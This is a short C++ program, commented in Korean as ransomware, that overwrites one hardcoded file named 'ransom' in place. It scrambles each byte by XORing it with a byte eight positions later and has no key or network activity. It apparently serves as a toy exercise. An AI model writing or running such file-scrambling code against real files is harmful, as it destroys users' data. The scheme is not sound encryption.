#include "pch.h"
#include <iostream>
#include <stdio.h>
#pragma warning (disable:4996)

int main()
{	
	FILE* ransom;
	ransom = fopen("ransom", "r+b");	/* 파일 ransom을 암호화하는 랜섬웨어 */
	int a=0,b=0;
	char aa[1024];

	if (!ransom) /* 해당 파일이 없을 경우 종료 */
		return 0;

	while (!feof(ransom)) {

		a = ftell(ransom);
		int size = fread(aa, 1, 1024, ransom); /* 한번에 1024만큼 암호화 */
		if (size == 0) break;

		for (int i = 0; i < size-8; i++) {
			aa[i] ^= aa[i + 8]; /* 파일의 값으로 파일을 암호화함 */
		}

		b = ftell(ransom);

		fseek(ransom, a, SEEK_SET);
		fwrite(aa, 1, size, ransom);

		fseek(ransom, b, SEEK_SET);
	}
	
	fclose(ransom);
	printf("파일 ransom을 암호화했습니다!");

	return 0;
}
